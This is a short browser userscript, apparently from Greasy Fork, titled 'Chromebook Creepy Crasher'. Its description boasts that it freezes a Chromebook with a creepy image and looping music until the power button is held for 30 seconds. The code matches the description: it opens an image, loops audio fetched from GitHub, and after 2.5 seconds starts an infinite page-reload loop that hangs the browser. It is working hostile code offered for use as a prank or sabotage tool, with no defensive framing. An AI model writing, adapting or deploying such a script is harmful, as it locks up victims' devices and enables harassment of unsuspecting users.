// ==UserScript==
// @name         Chromebook Creepy Crasher
// @version      1.0
// @description  This will freeze your chromebook with a creepy image on screen and it will play creepy music you wont be able to do anything not even turn down the music it will be shot until you fix it. The only way to fix it is to hold down the power button for 30 Seconds. Not sure if it works on windows.
// @author       GH0STMA1NE#1236
// @match none
// @namespace https://greasyfork.org/users/827411
// @downloadURL https://update.greasyfork.org/scripts/434258/Chromebook%20Creepy%20Crasher.user.js
// @updateURL https://update.greasyfork.org/scripts/434258/Chromebook%20Creepy%20Crasher.meta.js
// ==/UserScript==

setTimeout(function(){
    while(1)location.reload(1)
}, 2500);
 
var audio = new Audio("https://github.com/GH0STMA1NE/STUFF/raw/main/We%20Will%20Meet%20Again%20.mp3");
 
audio.oncanplaythrough = function(){
audio.play();
}
 
audio.loop = true;
 
audio.onended = function(){
audio.play();
}
 
window.open("https://i.ytimg.com/vi/RNoHcWE8tbQ/maxresdefault.jpg")